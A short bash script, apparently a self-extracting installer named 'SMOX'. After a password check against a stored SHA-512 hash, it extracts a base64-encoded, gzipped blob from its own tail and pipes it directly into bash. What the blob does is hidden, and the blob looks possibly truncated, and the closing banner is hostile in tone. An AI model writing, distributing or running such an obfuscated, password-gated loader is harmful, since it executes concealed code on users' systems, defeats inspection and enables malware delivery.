#!/bin/bash
###############################################################################
#  SMOX
###############################################################################

PASS_HASH="6f5d598b97078f754e93528da84cdaca0636c5a13dc1903b1a7005680f497f046db9e91d0d28795e04ee92770abcb15b58bbd1898ec004efe52a375f690c7549"

# ── Prompt for the password (no echo)
read -rsp "Enter installer password: " PASS_INPUT
echo

# ── Hash and compare
if [[ $(printf "%s" "$PASS_INPUT" | sha512sum | awk '{print $1}') != "$PASS_HASH" ]]; then
  echo "❌  Wrong password.  Exiting."
  exit 1
fi
unset PASS_INPUT   # scrub from memory

# ── Locate payload line number (marker “__PAYLOAD__”)
PAYLINE=$(grep -n "^__PAYLOAD__$" "$0" | cut -d: -f1)
((PAYLINE++))      # actual payload starts on next line

# ── Decode ➜ gunzip ➜ execute
tail -n +$PAYLINE "$0"        | \
  base64 --decode             | \
  gunzip                      | \
  bash -s "$@"                # forward any CLI args

exit 0

########################################################################
#                ---  Get the fuck out  ---                #
########################################################################
__PAYLOAD__
H4sICM+OZ2UC/8tJLS5RcEksSFWyUlAoykxOLMpMUbJSKMlIVSguSE3OzytR0lHIMU8vyU3OL0kv
zU1RSMkvTlsqLknNzFUoSc0rss/JzEvMTczJSMsvKk1MTczJUtJRQrIz1PIz0tVTs5OLMnPT1PKS
0/NK9EIyczVT1ZISS0qVrIy0lFKrEktLlGyUtfJT0ksKcotLgUA5O58UCUAAAAA
